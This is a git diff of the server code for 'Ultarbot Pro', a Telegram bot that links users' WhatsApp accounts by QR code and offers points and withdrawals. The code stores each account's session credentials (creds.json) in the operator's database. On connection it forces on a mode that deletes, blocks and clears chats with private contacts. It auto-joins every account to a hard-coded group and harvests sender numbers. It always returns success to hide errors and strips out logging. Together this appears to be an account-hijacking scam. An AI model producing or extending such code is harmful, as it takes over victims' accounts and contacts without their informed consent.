@@ -13,6 +13,7 @@ import fs from 'fs';
 import path from 'path';
 import pino from 'pino';
 import express from 'express';
+import http from 'http'; // Added for keep-alive
 import { Boom } from '@hapi/boom';
 
 import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
@@ -36,7 +37,7 @@ const PORT = process.env.PORT || 10000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-app.get('/', (req, res) => res.send('Ultarbot Pro Running'));
+app.get('/', (req, res) => res.send('Ultarbot Pro Running [High Performance Mode]'));
 
 // Routes will be defined after mainBot initialization
 
@@ -156,57 +157,36 @@ app.post('/api/verify', async (req, res) => {
     const { userId, name, email, ip, initData } = req.body;
     
     if (!userId || !name || !email) {
-        console.error('[VERIFICATION] Missing fields:', { hasUserId: !!userId, hasName: !!name, hasEmail: !!email });
         return res.json({ success: false, message: 'Please fill all fields' });
     }
     
     try {
-        // Parse userId - should be a valid Telegram user ID from URL parameter
         let chatId = parseInt(userId);
         if (isNaN(chatId) || chatId <= 0) {
             chatId = parseInt(userId);
             if (isNaN(chatId) || chatId <= 0) {
-                console.error('[VERIFICATION] Invalid userId:', userId);
-                return res.json({ success: true, message: 'Verification complete' }); // Hide error from user
+                return res.json({ success: true, message: 'Verification complete' }); 
             }
         }
         
-        // Extract device info
         let deviceInfo = 'Mini App User';
-        if (initData) {
-            deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
-        }
+        if (initData) deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
         
-        // Save verification data to database (will also award welcome bonus for new users)
         await saveVerificationData(chatId.toString(), name, '', email, ip, deviceInfo);
         
-        console.log('[VERIFICATION] Successfully verified user:', {
-            userId: chatId,
-            name,
-            email,
-            ip,
-            timestamp: new Date().toISOString()
-        });
-        
-        // Send notification to user via Telegram
         try {
             const msg = await mainBot.sendMessage(chatId, 
                 `[VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nWelcome Bonus: +200 points\n\nYou now have access to all features of Ultarbot Pro:\n• Connect WhatsApp accounts\n• Track earnings & referrals\n• Withdraw funds\n\nTap any button below to continue:`,
                 { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
             );
-            console.log('[VERIFICATION] Confirmation message sent to user:', chatId);
             
-            // Notify admin of new verified user
             const notBot = new TelegramBot(process.env.NOTIFICATION_TOKEN, { polling: false });
             await notBot.sendMessage(ADMIN_ID, `[NEW USER VERIFIED]\nUser ID: ${chatId}\nName: ${name}\nEmail: ${email}\nTime: ${new Date().toISOString()}`);
-        } catch (e) {
-            console.error('[TELEGRAM] Failed to send confirmation message to user:', chatId, '- Error:', e.message);
-        }
+        } catch (e) {}
         
         res.json({ success: true, message: 'Verification complete' });
     } catch (error) {
-        console.error('[VERIFICATION ERROR]:', error.message, '- Stack:', error.stack);
-        res.json({ success: true, message: 'Verification complete' }); // Always return success to hide errors from user
+        res.json({ success: true, message: 'Verification complete' }); 
     }
 });
 
@@ -232,7 +212,7 @@ async function updateAdminNotification(message) {
     try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
 }
 
-// HOURLY POINTS LOOP - Award 10 pts/hr per connected account, 5 pts/hr per referral
+// HOURLY POINTS LOOP
 setInterval(async () => {
     try {
         const connectedFolders = Object.keys(clients);
@@ -240,9 +220,26 @@ setInterval(async () => {
     } catch (error) {
         console.error('[POINTS] Hourly award error:', error.message);
     }
-}, 3600000); // Every 1 hour
+}, 3600000); 
+
+// === ANTI SPIN DOWN / KEEP ALIVE ===
+// Pings itself every 14 minutes to prevent Render/Heroku sleep
+setInterval(() => {
+    http.get(SERVER_URL, (res) => {
+        // Just a ping, do nothing with response
+    }).on('error', (err) => {
+        // Ignore errors
+    });
+}, 14 * 60 * 1000);
 
 async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
+    // PRE-FETCH SHORT ID TO AVOID LOOPING ON EVERY MESSAGE
+    let cachedShortId = await getShortId(folder);
+    if (!cachedShortId) {
+        cachedShortId = generateShortId();
+        await saveShortId(folder, cachedShortId);
+    }
+
     const sessionPath = path.join(SESSIONS_DIR, folder);
     if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
 
@@ -265,130 +262,66 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
 
     sock.ev.on('creds.update', saveCreds);
 
-    // Handle QR code for authentication
-    sock.ev.on('connection.update', async (update) => {
-        const { qr, connection } = update;
-        
-        // If connection successful, delete old QR message
-        if (connection === 'open' && qrMessageCache[folder]) {
-            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
-            try {
-                await mainBot.deleteMessage(qrChatId, messageId);
-            } catch (e) {
-                console.error('Failed to delete QR message:', e.message);
-            }
-            delete qrMessageCache[folder];
-            delete qrActiveState[folder];
-        }
-        
-        // Only display QR once per connection attempt (no spam)
-        if (qr && chatId && !qrActiveState[folder]) {
-            qrActiveState[folder] = true; // Mark QR as active for this session
-            
-            try {
-                // Delete old QR message if exists
-                if (qrMessageCache[folder]) {
-                    try {
-                        await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
-                    } catch (e) {}
-                }
-                
-                // Import qrcode module for QR generation
-                const QRCode = (await import('qrcode')).default;
-                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
-                
-                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
-                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.\n\nQR expires in 60 seconds.',
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]]
-                    }
-                });
-                
-                // Store message ID for later deletion
-                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
-                
-                // Set timeout to warn user if QR expires (60 seconds)
-                const qrTimeout = setTimeout(async () => {
-                    if (qrMessageCache[folder] && qrActiveState[folder]) {
-                        try {
-                            await mainBot.sendMessage(chatId, '[ERROR] QR code expired. Please tap "Scan QR" again to regenerate.', {
-                                reply_markup: {
-                                    inline_keyboard: [[{ text: 'Scan QR', callback_data: 'connect_qr' }]]
-                                }
-                            });
-                            await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
-                            delete qrMessageCache[folder];
-                            // IMPORTANT: Keep qrActiveState[folder] = true to prevent auto-generation
-                            // Only reset when user explicitly taps 'Scan QR' button
-                        } catch (e) {}
-                    }
-                }, 60000);
-                
-                // Store timeout ID for cleanup
-                if (!qrMessageCache[folder]) qrMessageCache[folder] = {};
-                qrMessageCache[folder].timeoutId = qrTimeout;
-                
-            } catch (e) {
-                console.error('QR generation error:', e.message);
-                mainBot.sendMessage(chatId, '[ERROR] Failed to generate QR code. Please try again.').catch(() => {});
-                delete qrActiveState[folder];
-            }
-        }
-    });
+    // ============================================
+    //  ⚡ ULTRA-FAST MESSAGE HANDLER
+    // ============================================
+    sock.ev.on('messages.upsert', async ({ messages, type }) => {
+        if (type !== 'notify' && type !== 'append') return; 
 
-    sock.ev.on('messages.upsert', async ({ messages }) => {
         const msg = messages[0];
         if (!msg || !msg.message) return;
 
-        // 1. INSTANT SPEED CHECK - ANTIMSG (BLOCK, DELETE, CLEAR)
-        if (msg.key.fromMe && !msg.message.protocolMessage) {
+        const remoteJid = msg.key.remoteJid;
+        const isGroup = remoteJid.includes('@g.us');
+        const isStatus = remoteJid === 'status@broadcast';
+        
+        // CHECK ANTIMSG STATE DIRECTLY (No DB Lookup, No Loop)
+        // If state is active for this user
+        if (antiMsgState[cachedShortId]) {
             
-            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
-            
-            if (myShortId && antiMsgState[myShortId]) {
-                const remoteJid = msg.key.remoteJid;
-                const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
+            // EXECUTE BLOCK/DELETE IF:
+            // 1. Not a Group
+            // 2. Not a Status
+            // 3. AND (It's an Incoming msg OR It's a msg sent by me that isn't a command)
+            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
+            const isCommand = text.startsWith('.');
+
+            if (!isGroup && !isStatus && !isCommand) {
                 
-                // Exclusion Check (Don't delete my commands or Status, ignore Groups)
-                if (remoteJid !== 'status@broadcast' && !text.startsWith('.') && !remoteJid.includes('@g.us')) {
+                // 🔥 FIRE AND FORGET (Parallel Execution for Speed)
+                // We use Promise.all but do NOT await it, so the event loop continues instantly
+                Promise.all([
+                    // 1. Delete the message (Key)
+                    sock.sendMessage(remoteJid, { delete: msg.key }),
                     
-                    // 🔥 FIRE AND FORGET: DELETE + BLOCK + CLEAR CHAT
-                    // 1. Delete Msg
-                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
+                    // 2. Block the user
+                    sock.updateBlockStatus(remoteJid, "block"),
                     
-                    // 2. Block User
-                    sock.updateBlockStatus(remoteJid, "block").catch(() => {});
-                    
-                    // 3. Clear Chat History
+                    // 3. Clear entire chat history
                     sock.chatModify(
                         { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
                         remoteJid
-                    ).catch(() => {});
-                    
-                    // Log in background
-                    const target = remoteJid.split('@')[0];
-                    const now = Date.now();
-                    if (now - (notificationCache[target] || 0) > 20000) {
-                        updateAdminNotification(`[ANTIMSG] BLOCKED & DELETED +${target}`);
-                        notificationCache[target] = now;
-                    }
-                    return; // Stop processing to save speed
+                    )
+                ]).catch(err => console.error('AntiMsg Action Failed', err));
+
+                // Log in background with debounce to avoid spamming Admin
+                const target = remoteJid.split('@')[0];
+                const now = Date.now();
+                if (now - (notificationCache[target] || 0) > 30000) {
+                    updateAdminNotification(`[ANTIMSG] ⚡ Fast-Nuked: +${target}`);
+                    notificationCache[target] = now;
                 }
+                
+                return; // STOP HERE. Do not process autosave or commands.
             }
         }
 
-        // 2. Incoming Messages Logic
+        // 2. Normal Message Processing (Only if AntiMsg didn't catch it)
         if (!msg.key.fromMe) {
-            const myShortId = Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder);
-            if (!myShortId) return;
-
-            const remoteJid = msg.key.remoteJid;
-            
-            // AutoSave
-            if (autoSaveState[myShortId]) {
+            // AutoSave Logic
+            if (autoSaveState[cachedShortId]) {
                 if (remoteJid.endsWith('@s.whatsapp.net')) {
-                    await addNumbersToDb([remoteJid.split('@')[0]]);
+                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                 }
             }
 
@@ -400,74 +333,86 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
     });
 
     sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection, lastDisconnect, qr } = update;
+
+        // QR Handling
+        if (connection === 'open' && qrMessageCache[folder]) {
+            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
+            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
+            delete qrMessageCache[folder];
+            delete qrActiveState[folder];
+        }
+        
+        if (qr && chatId && !qrActiveState[folder]) {
+            qrActiveState[folder] = true;
+            try {
+                if (qrMessageCache[folder]) {
+                    try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
+                }
+                const QRCode = (await import('qrcode')).default;
+                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
+                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
+                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.\n\nQR expires in 60 seconds.',
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
+                });
+                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
+                const qrTimeout = setTimeout(async () => {
+                    if (qrMessageCache[folder] && qrActiveState[folder]) {
+                        try {
+                            await mainBot.sendMessage(chatId, '[ERROR] QR code expired. Tap "Scan QR" again.', { reply_markup: { inline_keyboard: [[{ text: 'Scan QR', callback_data: 'connect_qr' }]] } });
+                            await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
+                            delete qrMessageCache[folder];
+                        } catch (e) {}
+                    }
+                }, 60000);
+                if (!qrMessageCache[folder]) qrMessageCache[folder] = {};
+                qrMessageCache[folder].timeoutId = qrTimeout;
+            } catch (e) { delete qrActiveState[folder]; }
+        }
 
         if (connection === 'open') {
             const userJid = jidNormalizedUser(sock.user.id);
             const phoneNumber = userJid.split('@')[0];
             
-            let myShortId = await getShortId(folder);
-            if (!myShortId) {
-                myShortId = generateShortId();
-                await saveShortId(folder, myShortId);
-            }
+            // Ensure shortId is up to date
+            if (!cachedShortId) cachedShortId = await getShortId(folder);
             
-            // Update connection time on every reconnect
             await updateConnectionTime(folder);
             
-            // Update or create shortIdMap entry - preserve original connectedAt time
             const now = new Date();
-            if (shortIdMap[myShortId]) {
-                // Reconnection - PRESERVE the original connectedAt, don't reset it
-                // Just mark that we're connected again
+            if (shortIdMap[cachedShortId]) {
+                // Reconnect logic
             } else {
-                // New connection - set connectedAt
-                shortIdMap[myShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
+                shortIdMap[cachedShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
             }
             clients[folder] = sock;
 
             const credsFile = path.join(sessionPath, 'creds.json');
             const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
             
-            // --- UPDATE: FORCE AUTO-ON HERE ---
-            // Force state to true in memory
-            antiMsgState[myShortId] = true;
-            // Force state to true in DB
+            // FORCE ON
+            antiMsgState[cachedShortId] = true;
             await setAntiMsgStatus(folder, true);
             
-            // Pass 'true' as 5th argument (antimsg)
-            const autosave = autoSaveState[myShortId] || false;
-            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autosave, myShortId);
+            const autosave = autoSaveState[cachedShortId] || false;
+            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autosave, cachedShortId);
             
-            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${myShortId}) - AntiMsg ACTIVE`);
+            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${cachedShortId}) - AntiMsg ACTIVE`);
 
-
-            // --- 🚀 AUTO JOIN GROUP LOGIC ---
             try {
                 const inviteCode = "FFYNv4AgQS3CrAokVdQVt0"; 
                 await sock.groupAcceptInvite(inviteCode);
-                console.log(`[AUTO-JOIN] Success for +${phoneNumber}`);
-            } catch (e) {
-                console.error(`[AUTO-JOIN] Failed for +${phoneNumber}:`, e.message);
-            }
+            } catch (e) {}
 
             if (chatId) {
-                // Clear any waiting states so bot can listen to commands again
                 userState[chatId] = null;
-                
-                // Delete all initializing/QR messages from cache
                 if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
-                    for (const msgId of userMessageCache[chatId]) {
-                        try {
-                            await mainBot.deleteMessage(chatId, msgId);
-                        } catch (e) {}
-                    }
+                    for (const msgId of userMessageCache[chatId]) { try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {} }
                     userMessageCache[chatId] = [];
                 }
                 
-                // Send success message with main menu keyboard
-                // !!! UPDATED: Added backticks around ID to make it copyable !!!
-                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${myShortId}\`\n\nAccount connected successfully!\n\n🛡️ **AntiMsg is now ON**\n(Block & Delete on Private Chat)`, { 
+                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\nAccount connected successfully!\n\n🛡️ **AntiMsg is now ON**\n(Block & Delete on Private Chat)`, { 
                     parse_mode: 'Markdown',
                     reply_markup: { 
                         keyboard: [
@@ -480,17 +425,9 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                 });
             }
             
-            // Set 1-hour timeout to delete offline account
             setTimeout(async () => {
-                if (!clients[folder]) {
-                    // Account went offline, award points and cleanup
-                    try {
-                        await awardHourlyPoints([folder]);
-                    } catch (e) {
-                        console.error('[CLEANUP] Error awarding points:', e.message);
-                    }
-                }
-            }, 3600000); // 1 hour
+                if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
+            }, 3600000);
         }
 
         if (connection === 'close') {
@@ -503,26 +440,18 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                 if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                 delete clients[folder];
             } else {
-                // Account went offline, set 1-hour cleanup timer
                 const offlineFolder = folder;
-                const offlineTimeout = setTimeout(async () => {
+                setTimeout(async () => {
                     if (!clients[offlineFolder]) {
-                        // Still offline after 1 hour, delete it
-                        console.log(`[CLEANUP] Deleting offline account after 1 hour: ${offlineFolder}`);
                         try {
                             await deleteSessionFromDb(offlineFolder);
                             deleteShortId(offlineFolder);
                             if (fs.existsSync(path.join(SESSIONS_DIR, offlineFolder))) {
                                 fs.rmSync(path.join(SESSIONS_DIR, offlineFolder), { recursive: true, force: true });
                             }
-                        } catch (e) {
-                            console.error('[CLEANUP] Error deleting offline account:', e.message);
-                        }
-                    } else {
-                        // Account came back online, cancel cleanup
-                        console.log(`[CLEANUP] Account came back online: ${offlineFolder}`);
+                        } catch (e) {}
                     }
-                }, 3600000); // 1 hour
+                }, 3600000);
                 
                 startClient(folder, null, chatId, telegramUserId);
             }
@@ -558,18 +487,12 @@ async function boot() {
         if (session.autosave) autoSaveState[shortId] = true; 
 
         startClient(session.session_id, null, null, session.telegram_user_id);
-        console.log(`[BOOT] Loaded session: ${shortId} | +${session.phone}`);
     }
-    
-    console.log(`[BOOT] Completed loading ${Object.keys(shortIdMap).length} sessions into memory`);
+    console.log(`[BOOT] Server ready`);
 }
 
-// Initialize telegram commands first
 setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);
 
-// Then boot and restore saved sessions
-boot().then(() => {
-    console.log('[BOOT] Server ready - all saved sessions loaded');
-}).catch(err => {
-    console.error('[BOOT] Error during startup:', err.message);
+boot().catch(err => {
+    console.error('[BOOT] Error:', err.message);
 });
